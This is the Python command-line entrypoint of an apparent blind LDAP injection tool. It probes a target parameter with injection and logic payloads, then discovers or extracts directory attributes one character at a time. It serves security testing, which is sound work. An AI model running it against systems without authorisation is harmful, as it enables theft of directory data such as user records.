#!/usr/bin/env python3
"""Blind LDAP Injection Scanner and Extractor CLI entrypoint."""

import json
import sys
from urllib.parse import parse_qs

import requests

from ldapmap_cli import parse_args
from ldapmap_constants import (
    COMMON_ATTRIBUTES,
    DETECTION_PAYLOADS,
    ERROR_SLEEP_SECONDS,
    LENGTH_TOLERANCE,
    LOGIC_PAYLOADS,
    TIMEOUT,
    TIMEOUT_RETRIES,
)
from ldapmap_engine import (
    calibrate,
    classify_response,
    discover_attributes,
    extract_attribute,
    get_baseline,
    is_true_response,
)
from ldapmap_http import build_session, send_request
from ldapmap_payloads import build_payload_data


def detect_injection(
    session: requests.Session,
    url: str,
    base_data: dict,
    param: str,
    true_status: int,
    true_length: int,
    verbose: bool = False,
    use_json: bool = False,
    probe_attr: str = "objectClass",
    true_statuses: set[int] | None = None,
    false_statuses: set[int] | None = None,
    timeout: float = TIMEOUT,
    timeout_retries: int = TIMEOUT_RETRIES,
    sleep_after_error: bool = True,
    error_sleep_seconds: float = ERROR_SLEEP_SECONDS,
) -> bool:
    """Probe the target with common LDAP meta-characters and logic payloads."""
    print("\n[*] --- Detection Phase ---")
    vulnerable = False

    detection_payloads = [
        payload.replace("objectClass", probe_attr) for payload in DETECTION_PAYLOADS
    ]
    logic_payloads = {
        label: payload.replace("objectClass", probe_attr)
        for label, payload in LOGIC_PAYLOADS.items()
    }
    status_true_set = true_statuses if true_statuses is not None else {true_status}

    for payload in detection_payloads:
        data = build_payload_data(base_data, param, payload, use_json)
        resp = send_request(
            session,
            url,
            data,
            verbose,
            use_json,
            timeout=timeout,
            timeout_retries=timeout_retries,
            sleep_after_error=sleep_after_error,
            error_sleep_seconds=error_sleep_seconds,
        )
        if resp is None:
            continue
        classification = classify_response(resp, status_true_set, true_length, false_statuses)
        different = classification != "true"
        marker = "[!] DIFFERENT" if different else "    same     "
        print(
            f"  {marker}  payload={repr(payload):<40} "
            f"HTTP {resp.status_code}, length={len(resp.content)}, class={classification.upper()}"
        )
        if different:
            vulnerable = True

    print("\n[*] AND/OR logic probes:")
    for label, payload in logic_payloads.items():
        data = build_payload_data(base_data, param, payload, use_json)
        resp = send_request(
            session,
            url,
            data,
            verbose,
            use_json,
            timeout=timeout,
            timeout_retries=timeout_retries,
            sleep_after_error=sleep_after_error,
            error_sleep_seconds=error_sleep_seconds,
        )
        if resp is None:
            continue
        classification = classify_response(resp, status_true_set, true_length, false_statuses)
        print(
            f"  [{label}] payload={repr(payload):<50} "
            f"→ {classification.upper()}"
        )
        if classification == "true":
            vulnerable = True

    return vulnerable


def _load_request_data(args) -> tuple[dict, bool]:
    if args.jsondata is None:
        parsed = parse_qs(args.data, keep_blank_values=True)
        return {key: values[0] for key, values in parsed.items()}, False

    try:
        base_data = json.loads(args.jsondata)
    except json.JSONDecodeError as exc:
        print(f"[!] Invalid JSON in --jsondata: {exc}", file=sys.stderr)
        sys.exit(1)

    if not isinstance(base_data, dict):
        print("[!] --jsondata must be a JSON object (key/value pairs).", file=sys.stderr)
        sys.exit(1)

    return base_data, True


def _resolve_attributes(extra_attrs: list[str] | None) -> tuple[list[str], str]:
    if not extra_attrs:
        return COMMON_ATTRIBUTES, "objectClass"

    all_attrs = list(dict.fromkeys(extra_attrs + COMMON_ATTRIBUTES))
    return all_attrs, extra_attrs[0]


def _resolve_status_sets(args, true_status: int) -> tuple[set[int], set[int]]:
    true_statuses = set(args.true_statuses) if args.true_statuses else {true_status}
    false_statuses = set(args.false_statuses) if args.false_statuses else set()
    overlap = true_statuses & false_statuses
    if overlap:
        false_statuses -= overlap
        print(
            f"[!] Ignoring overlapping FALSE statuses that are also TRUE: {sorted(overlap)}",
            file=sys.stderr,
        )
    return true_statuses, false_statuses


def main() -> None:
    """Main orchestration function."""
    args = parse_args()
    base_data, use_json = _load_request_data(args)

    if args.param not in base_data:
        data_flag = "--jsondata" if use_json else "--data"
        print(
            f"[!] Parameter '{args.param}' not found in {data_flag}. "
            "Check spelling and try again.",
            file=sys.stderr,
        )
        sys.exit(1)

    print(f"[*] Target  : {args.url}")
    print(f"[*] Param   : {args.param}")
    print(f"[*] Mode    : {'JSON body' if use_json else 'form data'}")
    if args.proxy:
        print(f"[*] Proxy   : {args.proxy}")
    if args.verbose:
        print("[*] Verbose : enabled")

    all_attrs, probe_attr = _resolve_attributes(args.attributes)
    if args.attributes:
        print(f"[*] Extra attributes: {', '.join(args.attributes)}")
        print(f"[*] Probe attribute : {probe_attr}")

    session = build_session(args.proxy)

    true_status, true_length = get_baseline(
        session,
        args.url,
        base_data,
        args.verbose,
        use_json,
        timeout=args.timeout,
        timeout_retries=args.timeout_retries,
        sleep_after_error=args.sleep_after_error,
        error_sleep_seconds=args.error_sleep_seconds,
    )

    true_status, true_length = calibrate(
        session,
        args.url,
        base_data,
        args.param,
        true_status,
        true_length,
        args.verbose,
        use_json,
        timeout=args.timeout,
        timeout_retries=args.timeout_retries,
        sleep_after_error=args.sleep_after_error,
        error_sleep_seconds=args.error_sleep_seconds,
    )
    true_statuses, false_statuses = _resolve_status_sets(args, true_status)

    vulnerable = detect_injection(
        session,
        args.url,
        base_data,
        args.param,
        true_status,
        true_length,
        args.verbose,
        use_json,
        probe_attr,
        true_statuses=true_statuses,
        false_statuses=false_statuses,
        timeout=args.timeout,
        timeout_retries=args.timeout_retries,
        sleep_after_error=args.sleep_after_error,
        error_sleep_seconds=args.error_sleep_seconds,
    )

    if not vulnerable:
        print(
            "\n[*] No distinguishable differences detected. "
            "The parameter may not be injectable, or the responses are indistinguishable."
        )
    else:
        print("\n[+] Parameter appears to be injectable!")

    if args.extract:
        value = extract_attribute(
            session,
            args.url,
            base_data,
            args.param,
            args.extract,
            true_status,
            true_length,
            args.verbose,
            use_json,
            true_statuses=true_statuses,
            false_statuses=false_statuses,
            exclude_value=args.exclude_value,
            find_all=args.find_all,
            extraction_filters=args.extract_filters,
            charset=args.extract_charset,
            timeout=args.timeout,
            timeout_retries=args.timeout_retries,
            sleep_after_error=args.sleep_after_error,
            error_sleep_seconds=args.error_sleep_seconds,
        )
        if isinstance(value, list):
            if value:
                print(f"\n[+] Extracted {args.extract} values: {', '.join(value)}")
            else:
                print(f"\n[-] Could not extract value for attribute '{args.extract}'.")
        elif value:
            print(f"\n[+] Extracted {args.extract} = {value}")
        else:
            print(f"\n[-] Could not extract value for attribute '{args.extract}'.")
    else:
        attrs = discover_attributes(
            session,
            args.url,
            base_data,
            args.param,
            true_status,
            true_length,
            args.verbose,
            use_json,
            all_attrs,
            true_statuses=true_statuses,
            false_statuses=false_statuses,
            timeout=args.timeout,
            timeout_retries=args.timeout_retries,
            sleep_after_error=args.sleep_after_error,
            error_sleep_seconds=args.error_sleep_seconds,
        )
        if attrs:
            print(f"\n[+] Discovered attributes: {', '.join(attrs)}")
            print("[*] Re-run with --extract <attribute> to retrieve the full value.")
        else:
            print("\n[-] No common attributes discovered.")


if __name__ == "__main__":
    main()
